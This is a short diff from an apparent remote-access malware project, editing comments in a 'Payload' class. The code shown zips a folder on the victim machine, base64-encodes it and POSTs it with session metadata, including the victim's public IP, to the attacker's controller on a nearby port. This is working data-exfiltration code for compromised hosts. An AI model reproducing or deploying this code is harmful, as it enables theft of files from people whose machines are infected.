@@ -649,7 +649,7 @@ class Payload():
             elif os.path.isdir(filename):
                 host, port = self.connection.getpeername()
                 folder = pathlib.Path(filename)
-                # zip = zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED)
+                # Exfiltration of dir done with temp zip file on memory
                 zip_path = './temp.zip'
                 with zipfile.ZipFile(zip_path, 'w') as zip:
                         for file in folder.iterdir():
@@ -657,6 +657,7 @@ class Payload():
                 zip.close()
                 with open("temp.zip", 'rb') as fp:
                     data = base64.b64encode(fp.read())
+                # decode bytes into a utf-8 encoded string
                 datastr = data.decode('utf-8')
                 json_data = {'data': datastr, 'filename': filename, 'type': ".zip", 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
